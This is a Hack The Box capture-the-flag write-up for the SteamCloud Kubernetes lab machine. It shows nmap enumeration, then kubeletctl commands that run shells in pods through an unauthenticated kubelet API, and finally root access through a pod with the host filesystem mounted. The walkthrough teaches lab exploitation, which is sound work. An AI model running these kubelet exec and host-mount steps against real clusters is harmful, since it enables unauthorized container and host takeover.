+++
title = "HTB Writeup - SteamCloud (Easy)"
author = "CyberSpider"
description = "Writeup of SteamCloud from Hack The Box."
tags = ['htb', 'easy', 'linux']
lastmod = 2023-07-21
draft = false
+++

The `SteamCloud` machine is an easy linux box.

## Nmap Scan

I do a `nmap scan`:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV  -A 10.10.11.133    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 21:14 EDT
Nmap scan report for 10.10.11.133
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
80/tcp   open  http          nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
8443/tcp open  ssl/https-alt
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2023-07-18T06:42:04
|_Not valid after:  2026-07-18T06:42:04
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 7b80e79b-7b54-48e2-bc5d-220ca10b8f26
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
|     Date: Thu, 20 Jul 2023 01:15:11 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 406f7305-7cf2-4f8f-acf9-2f2fb2e808df
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
|     Date: Thu, 20 Jul 2023 01:15:10 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 18f532b2-8d4b-463d-bb0f-23b45d5e0803
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
|     Date: Thu, 20 Jul 2023 01:15:10 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/19%Time=64B88A9D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20406f7
SF:305-7cf2-4f8f-acf9-2f2fb2e808df\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6
SF:105982b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-
SF:b594-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2001:15:10\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2018f532b2-8d4
SF:b-463d-bb0f-23b45d5e0803\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6105982b
SF:66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-b594-d9
SF:2bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2001:15:10\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x207b80e79b-
SF:7b54-48e2-bc5d-220ca10b8f26\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e61059
SF:82b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-b594
SF:-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2001:15:11\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.85 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -p- 10.10.11.133 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 21:45 EDT
Host is up (0.12s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
8443/tcp  open  https-alt
10249/tcp open  unknown
10250/tcp open  unknown
10256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3760.97 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p 22,2379,2380,8443,10249,10250,10256 10.10.11.133 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 22:07 EDT
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 22:08 (0:00:11 remaining)
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 85.71% done; ETC: 22:08 (0:00:12 remaining)
Nmap scan report for 10.10.11.133
Host is up (0.12s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-07-19T06:42:06
|_Not valid after:  2024-07-18T06:42:07
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-07-19T06:42:06
|_Not valid after:  2024-07-18T06:42:07
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
8443/tcp  open  ssl/https-alt
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2023-07-18T06:42:04
|_Not valid after:  2026-07-18T06:42:04
|_http-title: Site doesn't have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: d09285cf-227e-4419-9b4d-705ed21c026e
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
|     Date: Thu, 20 Jul 2023 02:07:15 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 80fe9101-e58b-4ded-aafe-844858d7c769
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
|     Date: Thu, 20 Jul 2023 02:07:14 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 7844aecb-3752-4cb0-b356-d1a1e77b6817
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 70d21561-358b-4a05-8242-e6105982b66c
|     X-Kubernetes-Pf-Prioritylevel-Uid: 053db608-66c1-4350-b594-d92bacaf9737
|     Date: Thu, 20 Jul 2023 02:07:14 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud@1689748929
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2023-07-19T05:42:09
|_Not valid after:  2024-07-18T05:42:09
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/19%Time=64B896D2%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2080fe9
SF:101-e58b-4ded-aafe-844858d7c769\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6
SF:105982b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-
SF:b594-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2002:07:14\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x207844aecb-375
SF:2-4cb0-b356-d1a1e77b6817\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e6105982b
SF:66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-b594-d9
SF:2bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2002:07:14\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20d09285cf-
SF:227e-4419-9b4d-705ed21c026e\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x2070d21561-358b-4a05-8242-e61059
SF:82b66c\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20053db608-66c1-4350-b594
SF:-d92bacaf9737\r\nDate:\x20Thu,\x2020\x20Jul\x202023\x2002:07:15\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.28 seconds
```

According to the provided  [Documentation](https://kubernetes.io/docs/reference/ports-and-protocols/), , ports `2379` and `2380` are indeed associated with `Kubernetes`. Additionally, the ports that nmap identified as `InfluxDB` are also part of Kubernetes.

Furthermore, TCP port 8443 serves as the `primary API server` for the `cluster`. This port is crucial for communication with the Kubernetes API server, which is a central component of the Kubernetes control plane. Through this API server, users and various Kubernetes components can interact with the `cluster` to manage and monitor resources, deploy applications, and perform other `administrative tasks`.

## Kubernetes

I have the option to install a tool such as `kubectl` (follow the instructions [here](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)) and attempt to interact with it, but it will only request authentication.

```sh
┌──(kali㉿kali)-[~]
└─$ kubectl --server https://10.10.11.133:8443  get pod
Please enter Username: system
Please enter Password: Unable to connect to the server: x509: certificate signed by unknown authority
```
  
A tool similar to `kubectl` for kubelets is called `kubeletctl` (available at [kubeletctl GitHub repository](https://github.com/cyberark/kubeletctl)). Once I've installed it following the instructions in the README, I will use the `pods` command to list all the pods present on the node. There are quite a few pods listed.

```sh
┌──(kali㉿kali)-[~]
└─$ ./kubeletctl_linux_amd64 pods -s 10.10.11.133
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-bzvqz           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ 0xdf-pod                           │ default     │ 0xdf-pod                │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 9 │ kube-proxy-nwx25                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

The `runningpods` command provides a plethora of `JSON data` regarding the currently active pods.

```json
┌──(kali㉿kali)-[~]
└─$ ./kubeletctl_linux_amd64 runningpods -s 10.10.11.133         
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "2badf965-5628-479e-9775-5e4442eb154a",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "nginx",
            "image": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "storage-provisioner",
        "namespace": "kube-system",
        "uid": "4cf18c50-5cb2-41a5-91a0-bcad49e6d7e0",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "storage-provisioner",
            "image": "sha256:6e38f40d628db3002f5617342c8872c935de530d867d0f709a2fbda1a302a562",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "kube-scheduler-steamcloud",
        "namespace": "kube-system",
        "uid": "3232b72c69e9f8bf518a7d727d878b27",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-scheduler",
            "image": "sha256:0aa9c7e31d307d1012fb9e63c274f1110868709a2c39f770dd82120cd2b8fe0f",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "kube-controller-manager-steamcloud",
        "namespace": "kube-system",
        "uid": "be2478237d1af444b624cb01f51f79c4",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-controller-manager",
            "image": "sha256:05c905cef780c060cdaad6bdb2be2d71a03c0b9cb8b7cc10c2f68a6d36abd30d",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "0xdf-pod",
        "namespace": "default",
        "uid": "c7bdf3ab-4b8d-4c4e-b14e-54044b8c5a27",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "0xdf-pod",
            "image": "sha256:295c7be079025306c4f1d65997fcf7adb411c88f139ad1d34b537164aa060369",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "kube-proxy-nwx25",
        "namespace": "kube-system",
        "uid": "e1f6d721-a928-425e-9572-a84d67ab75a7",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-proxy",
            "image": "sha256:6120bd723dcedd08f7545da1a8458ad4f23fbd1e94cb578519122f920a77b737",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "coredns-78fcd69978-bzvqz",
        "namespace": "kube-system",
        "uid": "106f4483-d82e-4530-8cbd-f0a17d317764",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "coredns",
            "image": "sha256:8d147537fb7d1ac8895da4d55a5e53621949981e2e6460976dae812f83d84a44",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "etcd-steamcloud",
        "namespace": "kube-system",
        "uid": "967b9bee71f2e3cec06ff1dbde2a2a19",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "etcd",
            "image": "sha256:0048118155842e4c91f0498dd298b8e93dc3aecc7052d9882b76f48e311a76ba",
            "resources": {}
          }
        ]
      },
      "status": {}
    }, 
    {
      "metadata": {
        "name": "kube-apiserver-steamcloud",
        "namespace": "kube-system",
        "uid": "c1926d0465cd9de10197b95a2c359105",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "kube-apiserver",
            "image": "sha256:53224b502ea4de7925ca5ed3d8a43dd4b500b2e8e4872bf9daea1fc3fec05edc",
            "resources": {}
          }
        ]
      },
      "status": {}
    }
  ]
}

    
```

To enhance readability, I will utilize `jq` to extract a list of `pod names` and their corresponding namespaces.

```sh
┌──(kali㉿kali)-[~]
└─$ ./kubeletctl_linux_amd64 runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
["etcd-steamcloud","kube-system"]
["0xdf-pod","default"]
["nginx","default"]
["kube-proxy-nwx25","kube-system"]
["coredns-78fcd69978-bzvqz","kube-system"]
["kube-scheduler-steamcloud","kube-system"]
["storage-provisioner","kube-system"]
["kube-controller-manager-steamcloud","kube-system"]
["kube-apiserver-steamcloud","kube-system"]
```

Out of the list of pods obtained, only one pod exists outside the `kube-system` namespace.

## Foothold

I can execute the commands:

```sh
┌──(kali㉿kali)-[~]
└─$ ./kubeletctl_linux_amd64  -s 10.10.11.133 exec "whoami" -p nginx -c nginx
root
```

I take the `user flag`:

```
┌──(kali㉿kali)-[~]
└─$ ./kubeletctl_linux_amd64  -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
root@nginx:~# cd /root
cd /root
root@nginx:~# ls
ls
user.txt
root@nginx:~# cat user.txt
cat user.txt
8c091afeac60fc28c7ad3a6763096529
root@nginx:~# 
```

## Privilege Escalation

The approach I am  using involves creating a `pod` (container) with the `root file system` mapped into it, allowing you to `execute commands` within the pod and access the mapped volume, which represents the full file system of the host. I trying this with a pod named `0xdf-pod`.

```sh
┌──(kali㉿kali)-[~]
└─$ ./kubeletctl_linux_amd64  exec "/bin/bash" -s 10.10.11.133 -p 0xdf-pod -c 0xdf-pod
root@steamcloud:/# whoami
whoami
root
root@steamcloud:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@steamcloud:/# find / -name root.txt 2>/dev/null
find / -name root.txt 2>/dev/null
/mnt/root/root.txt
```

I take the `root flag`:

```
root@steamcloud:/# cat /mnt/root/root.txt
cat /mnt/root/root.txt
6c3b4e5bdaab0b50d446f5f4ecfccd61
root@steamcloud:/# 
```
